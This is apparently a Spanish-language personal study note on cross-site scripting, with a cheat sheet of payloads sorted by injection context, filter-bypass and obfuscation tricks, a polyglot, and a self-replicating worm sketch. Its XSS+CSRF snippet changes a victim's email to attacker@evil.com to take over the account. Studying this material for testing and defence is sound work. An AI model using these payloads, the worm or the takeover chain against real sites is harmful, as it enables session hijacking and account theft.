---
title: "XSS — Cross-Site Scripting"
type: note
status: active
tags:
  - seguridad
  - web
  - xss
  - vulnerabilidades
aliases:
  - Cross-Site Scripting
  - XSS
  - Cross Site Scripting
created: 2026-06-13
updated: 2026-06-13
---

# XSS — Cross-Site Scripting

> [!INFO] Fuente
> PortSwigger XSS, PayloadsAllTheThings, Reportes de HackerOne.

---

## Tipos de XSS

| Tipo | Persistencia | Trigger | Severidad |
|------|-------------|---------|-----------|
| **Reflejado** | No (esta en la URL) | Victima hace clic en link malicioso | Media |
| **Almacenado** | Si (en el servidor) | Cualquier usuario visita la pagina | Alta-Critica |
| **DOM-based** | No (solo en cliente) | El JS del sitio procesa input inseguro | Media |

### Cuando es critico

- XSS almacenado en pagina de admin → session hijacking del admin → full site takeover
- XSS en pagina de perfil → self-XSS pero si hay worm → se propaga
- XSS con credenciales robadas → ATO
- XSS + CSRF bypass → acciones en nombre de la victima

---

## Payloads por contexto

### Contexto: Entre tags HTML

```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

### Contexto: Dentro de un atributo HTML

```html
"><script>alert(1)</script>
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) "
" onfocus=alert(1) id=x "
```

### Contexto: Dentro de <script>

```javascript
</script><script>alert(1)</script>
';alert(1);'
\';alert(1);//
```

### Contexto: Dentro de atributo href/src

```html
javascript:alert(1)
jav&#x09;ascript:alert(1)
jav&#x0A;ascript:alert(1)
```

### Contexto: Dentro de CSS (raro pero existe)

```css
</style><script>alert(1)</script>
background:url(javascript:alert(1))
```

---

## Bypass de filters

### Tag event handlers alternativos

```html
<iframe onload=alert(1)>
<marquee onstart=alert(1)>
<p onclick=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

### Obfuscacion

```html
<scr<script>ipt>alert(1)</scr</script>ipt>          # Tag splitting
%3Cscript%3Ealert(1)%3C/script%3E                   # URL encoding
\\u003cscript\\u003ealert(1)\\u003c/script\\u003e    # Unicode escape
<svg/onload=alert(1)>                                # Sin espacio
<svg%0Aonload=alert(1)>                              # Newline como separador
```

### Polyglot XSS

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)>\x3e
```

---

## XSS Worm

```javascript
// Ejemplo: XSS en pagina de perfil que se autoreplica
// La victima ejecuta el payload → publica el mismo payload en su perfil

var xhr = new XMLHttpRequest();
xhr.open("POST", "/api/profile/update", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify({
  bio: "<script>/* el mismo payload que se esta ejecutando */</script>"
}));
```

---

## XSS + CSRF

```javascript
// XSS que realiza acciones en nombre de la victima
var xhr = new XMLHttpRequest();
xhr.open("POST", "/api/email/change", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify({email: "attacker@evil.com"}));
// Luego: forgot password → token al atacante → ATO
```

---

## Practica

| Recurso | Link |
|---------|------|
| PortSwigger XSS Labs | portswigger.net/web-security/cross-site-scripting |
| XSS game (Google) | xss-game.appspot.com |
| alert(1) to win | alf.nu/alert1 |
| XSS Challenge (prompt(1)) | prompt.ml |
| PwnFunction XSS | youtube.com/PwnFunction |

---

## Ver tambien

- [[SEGURIDAD/Vulnerabilidades Web]]
- [[SEGURIDAD/Hacking Activo]]
- [[SEGURIDAD/CSRF]]
- [[SEGURIDAD/00 - INDICE]]
